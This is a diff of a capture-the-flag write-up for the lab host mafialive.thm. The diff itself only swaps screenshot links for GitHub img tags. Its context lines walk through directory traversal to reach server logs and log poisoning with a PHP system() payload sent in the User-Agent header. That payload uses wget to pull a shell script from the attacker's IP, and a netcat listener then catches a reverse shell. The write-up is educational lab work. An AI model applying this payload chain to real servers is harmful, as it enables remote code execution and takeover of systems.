@@ -4,11 +4,11 @@ ___________________
 
 First, we need to check if it is vulnerable to Directory Traversal.
 
-![[Captura de pantalla 2026-03-12 171231.png]]
+<img width="1859" height="249" alt="Captura de pantalla 2026-03-12 171231" src="https://github.com/user-attachments/assets/2032b604-471a-469a-aea1-4094f708e38d" />
 
 With this done, we are now going to verify if we can exploit the logs and therefore find a Log Poisoning vulnerability.
 
-![[Captura de pantalla 2026-03-12 171431.png]]
+<img width="1919" height="574" alt="Captura de pantalla 2026-03-12 171431" src="https://github.com/user-attachments/assets/05362dd8-9753-4405-983b-290329639580" />
 
 We confirm access to the logs:
 
@@ -18,11 +18,11 @@ http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.
 
 With Log Poisoning confirmed, we are now going to inject information through the logs to confirm this vulnerability. We will send the requests using **curl**.
 
-![[Captura de pantalla 2026-03-12 174109.png]]
+<img width="692" height="215" alt="Captura de pantalla 2026-03-12 174109" src="https://github.com/user-attachments/assets/caf41900-23ef-4c5e-bae4-21467c24bcc0" />
 
 We refresh the page and check the logs.
 
-![[Captura de pantalla 2026-03-12 174051.png]]
+<img width="701" height="79" alt="Captura de pantalla 2026-03-12 174051" src="https://github.com/user-attachments/assets/431077e0-2a89-47f8-9afe-4455f0394593" />
 
 We see that our requests entered correctly. Keeping this in mind, we are going to open port 80 with Python to send a malicious script that will contain a **SHELL**.
 
@@ -39,13 +39,13 @@ curl -s 'http://mafialive.thm' -H "User-Agent: <?php system('wget http://192.168
 
 We refresh the page when sending the command.
 
-![[Captura de pantalla 2026-03-12 175718.png]]
+<img width="596" height="82" alt="Captura de pantalla 2026-03-12 175718" src="https://github.com/user-attachments/assets/d8699d10-d120-4008-9e54-786bd6a48662" />
 
 The Python connection confirms that the victim machine received it; now we are going to grant execution permissions and execute the script inside the victim machine (waiting with `nc -nlvp 4444` to receive the connection from the victim machine).
 
-![[Captura de pantalla 2026-03-13 001155.png]]
+<img width="877" height="287" alt="Captura de pantalla 2026-03-13 001155" src="https://github.com/user-attachments/assets/cb69c4e8-99df-4b38-bdda-39935afe0df4" />
 
-![[Captura de pantalla 2026-03-13 001109.png]]
+<img width="657" height="315" alt="Captura de pantalla 2026-03-13 001109" src="https://github.com/user-attachments/assets/cf3fd426-b7e4-472b-b00c-10b597521f5a" />
 
 And we are in; we have successfully executed an **LFI (Directory Traversal) with Log Poisoning**. With this, we only have to escalate privileges.
 
